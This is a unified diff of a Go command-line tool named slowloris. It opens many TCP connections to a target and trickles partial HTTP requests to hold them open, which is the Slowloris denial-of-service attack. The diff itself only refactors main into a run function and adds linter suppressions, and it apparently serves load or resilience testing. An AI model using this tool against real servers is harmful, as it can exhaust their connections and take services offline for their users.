@@ -50,39 +50,52 @@ func main() {
 		fmt.Fprintln(os.Stderr, "slowloris: -drip-byte must be positive")
 		os.Exit(2)
 	}
+	os.Exit(run(*target, *n, *path, *drip, *interval, *hold, *ramp))
+}
 
+// run holds the dribbling connections until ctx ends; the exit code
+// separation keeps os.Exit out of the deferred-cleanup path (gocritic
+// exitAfterDefer).
+func run(target string, n int, path string, drip int, interval, hold, ramp time.Duration) int {
 	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGTERM, syscall.SIGINT)
 	defer stop()
 
-	if *hold > 0 {
+	if hold > 0 {
 		var cancel context.CancelFunc
-		ctx, cancel = context.WithTimeout(ctx, *hold)
+		ctx, cancel = context.WithTimeout(ctx, hold)
 		defer cancel()
 	}
 
-	conns, err := dialAll(ctx, *target, *n, *ramp)
+	conns, err := dialAll(ctx, target, n, ramp)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "SLOWLORIS_ERR %v\n", err)
-		os.Exit(1)
+		return 1
 	}
 	fmt.Printf("SLOWLORIS_READY conns=%d target=%s drip=%dB interval=%s\n",
-		len(conns), *target, *drip, *interval)
+		len(conns), target, drip, interval)
 
 	var wg sync.WaitGroup
 	for _, c := range conns {
 		wg.Add(1)
 		go func(c *net.TCPConn) {
 			defer wg.Done()
-			dribble(ctx, c, *path, *drip, *interval)
+			dribble(ctx, c, path, drip, interval)
 		}(c)
 	}
 	wg.Wait()
 
-	for _, c := range conns {
-		_ = c.SetLinger(0)
-		_ = c.Close()
-	}
+	closeAll(conns)
 	fmt.Println("SLOWLORIS_DONE")
+	return 0
+}
+
+// closeAll resets every connection (SO_LINGER 0: no TIME_WAIT) and closes
+// it. A close error on teardown changes nothing.
+func closeAll(conns []*net.TCPConn) {
+	for _, c := range conns {
+		_ = c.SetLinger(0) //nolint:errcheck // teardown: a linger error changes nothing
+		_ = c.Close()      //nolint:errcheck // teardown: a close error changes nothing
+	}
 }
 
 // dialAll opens n connections to target, spreading them over ramp.
@@ -94,14 +107,14 @@ func dialAll(ctx context.Context, target string, n int, ramp time.Duration) ([]*
 		c, err := d.DialContext(ctx, "tcp4", target)
 		if err != nil {
 			for _, ec := range conns {
-				_ = ec.SetLinger(0)
-				_ = ec.Close()
+				_ = ec.SetLinger(0) //nolint:errcheck // teardown: a linger error changes nothing
+				_ = ec.Close()      //nolint:errcheck // teardown: a close error changes nothing
 			}
 			return nil, fmt.Errorf("dial %d/%d: %w", i+1, n, err)
 		}
 		tc, ok := c.(*net.TCPConn)
 		if !ok {
-			_ = c.Close()
+			_ = c.Close() //nolint:errcheck // teardown: a close error changes nothing
 			return nil, fmt.Errorf("dial %d: not a TCP conn", i+1)
 		}
 		conns = append(conns, tc)
